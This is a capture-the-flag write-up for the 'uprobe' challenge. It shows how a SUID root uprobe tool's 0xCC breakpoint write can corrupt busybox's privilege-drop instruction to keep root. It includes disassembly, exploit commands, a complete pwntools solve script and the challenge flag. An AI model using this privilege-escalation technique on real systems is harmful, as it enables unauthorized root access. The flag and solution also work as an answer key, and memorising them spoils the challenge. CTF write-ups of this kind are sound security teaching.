# uprobe — Write up (14 solves)

## What the challenge is “hiding” / testing you on

At first glance this looks like an eBPF/uprobes demo:

- There’s a **SUID root** program, `/usr/bin/uprobe-runner`, that can attach a **uprobe** (userspace probe) to *any* binary at a user‑provided **file offset**.
- The provided BPF program just prints `"UPROBE triggered!\n"`, which is a red herring: it’s not about the message.

The real trick is:

> **Registering a uprobe works by patching the target process’ code with an `int3` breakpoint (`0xCC`) at the requested address.**
>
> If a SUID root tool lets you choose **where** that patch happens, you effectively get a “write 1 byte (`0xCC`) anywhere in a mapped executable” primitive.

That’s enough to break the security of other SUID programs (like `busybox`) and become root.

---

## Goal

Read `/flag` (it is owned by root and has permissions `----------`, so normal users can’t read it).

---

## Connecting (PoW + login)

The service is a jailed QEMU VM with a Proof‑of‑Work gate.

1) Connect:

```bash
nc 136.107.76.27 5000
```

2) You’ll see something like:

```
proof of work:
curl -sSfL https://pwn.red/pow | sh -s s.AAAnEA==.XXXXXXXXXXXX
solution:
```

Run the shown command locally, copy the output, and paste it as the `solution`.

3) The VM boots and shows:

```
buildroot login:
```

Login as `ctf` (no password).

---

## Quick recon inside the VM

### 1) Confirm the flag is protected

```sh
ls -l /flag
cat /flag
```

You should see permissions like `----------` and `Permission denied`.

### 2) Find SUID binaries (things that run as root)

```sh
find / -perm -4000 -type f 2>/dev/null
```

You’ll see at least:

- `/bin/busybox` (SUID root)
- `/usr/bin/uprobe-runner` (SUID root)

### 3) Why “just use busybox” doesn’t work

Even though `/bin/busybox` is SUID root, it **drops privileges** for safety, so you still can’t read `/flag`.

Example:

```sh
/bin/busybox id
/bin/busybox cat /flag
```

You’ll still get permission denied on `/flag`.

---

## Understanding the bug: why `uprobe-runner` is dangerous

### What is a uprobe (short version)

A uprobe is a kernel feature for tracing user programs.

Implementation detail that matters for pwn:

- When you register a uprobe at some address, the kernel **patches the code** at that address with an `int3` breakpoint (`0xCC`).
- When the program hits that byte, it traps into the kernel, the probe handler runs, and the kernel *temporarily* restores/single‑steps the original instruction.

### The vulnerability in this challenge

`/usr/bin/uprobe-runner` runs as root (SUID) and lets an unprivileged user pick:

- the binary path
- the exact offset inside that binary

So we can ask root to insert an `int3` (`0xCC`) anywhere.

That is already bad — but the key “pwn” trick is:

> If we choose an offset that is **not the start of a real instruction**, we can corrupt bytes that are used as data (like an immediate/displacement) of an instruction that *is* executed.

If the uprobe is placed on a “fake instruction” address that is never actually executed, the `0xCC` stays there and permanently changes the behavior of nearby real instructions.

---

## Finding a good patch target: busybox’s privilege drop

We want a SUID program that becomes root but then drops privileges. If we can break the “drop privileges” logic, we keep **euid=0**.

`busybox` is perfect because it’s present and easy to run.

### Offline analysis (recommended)

If you have the challenge files locally (kernel+initramfs), extract `busybox` and disassemble it:

```bash
objdump -d -M intel initramfs_root/bin/busybox | rg -n "getuid@plt|setuid@plt|bb948"
```

In this build, you’ll find the key sequence around offset `0xde11`:

```
de11: 44 8b 25 30 db 0a 00    mov r12d, DWORD PTR [rip+0xadb30]  # bb948
de18: 45 85 e4                test r12d, r12d
de1b: 74 4e                   je  de6b  (skip dropping privs when r12d==0)
...
de66: e8 ...                  call setuid@plt   (drops to uid=r12d)
```

Interpretation:

- `r12d` holds a UID value.
- If `r12d != 0`, busybox will call `setuid(r12d)` and drop root.
- If `r12d == 0`, it *skips* that path and keeps root privileges.

### Where to patch

The instruction at `0xde11` is:

```
44 8b 25 30 db 0a 00
```

The last 4 bytes (`30 db 0a 00`) are the RIP‑relative displacement.

If we change the **first byte** of that displacement from `0x30` to `0xCC`, the instruction becomes:

- still a valid `mov r12d, [rip+disp]`
- but now it reads from a **different** global address, which (in this build) is **0**

So `r12d` becomes `0`, the `test r12d, r12d` is zero, and busybox skips privilege dropping.

That byte we want to change is at:

> `0xde11 + 3 = 0xde14`

So we want uprobe-runner to patch offset **`0xde14`** in `/bin/busybox`.

---

## Exploitation (step‑by‑step)

1) Start the uprobe patcher in the background (as `ctf`):

```sh
/usr/bin/uprobe-runner /bin/busybox 0xde14 >/tmp/ur.log 2>&1 &
```

This runs as root due to SUID and registers the probe (which inserts `0xCC` at that offset).

2) Verify busybox now keeps root (note the `euid=0`):

```sh
/bin/busybox id
```

Expected output contains something like:

```
uid=1000(ctf) gid=1000(ctf) euid=0(root) groups=1000(ctf)
```

3) Read the flag:

```sh
/bin/busybox cat /flag
```

4) (Optional) Kill the background uprobe-runner:

```sh
ps
kill <pid>
```

---

## One-shot automation script (optional)

This script:

- solves the PoW using the exact `curl | sh` command they provide
- logs in as `ctf`
- applies the uprobe patch
- prints the flag

Save as `solve.py` locally and run with Python 3:

```python
#!/usr/bin/env python3
from pwn import remote
import re
import subprocess
import time

HOST, PORT = "136.107.76.27", 5000

def solve_pow(challenge: bytes) -> bytes:
    cmd = f"curl -sSfL https://pwn.red/pow | sh -s {challenge.decode()}"
    return subprocess.check_output(cmd, shell=True).strip()

io = remote(HOST, PORT)
banner = io.recvuntil(b"solution:")
m = re.search(rb"sh -s (\S+)", banner)
challenge = m.group(1)
io.sendline(solve_pow(challenge))

io.recvuntil(b"login:")
io.sendline(b"ctf")
io.recvuntil(b"$ ")

# Patch busybox privilege-drop logic
io.sendline(b"/usr/bin/uprobe-runner /bin/busybox 0xde14 >/tmp/ur.log 2>&1 &")
time.sleep(0.5)
io.recvuntil(b"$ ")

io.sendline(b"/bin/busybox cat /flag")
time.sleep(0.5)
print(io.recvuntil(b"$ ").decode(errors="replace"))
io.close()
```

---

## Why this works (in one sentence)

Because `uprobe-runner` (running as root) lets you force the kernel to plant an `int3` (`0xCC`) at an attacker‑chosen offset, you can corrupt a byte inside `busybox`’s privilege‑dropping code so it no longer drops root — then you read `/flag`. The flag is: uoftctf{n0n_c0ns74n7_shif7_is_700_big_0f_4n_3x73nsi0n}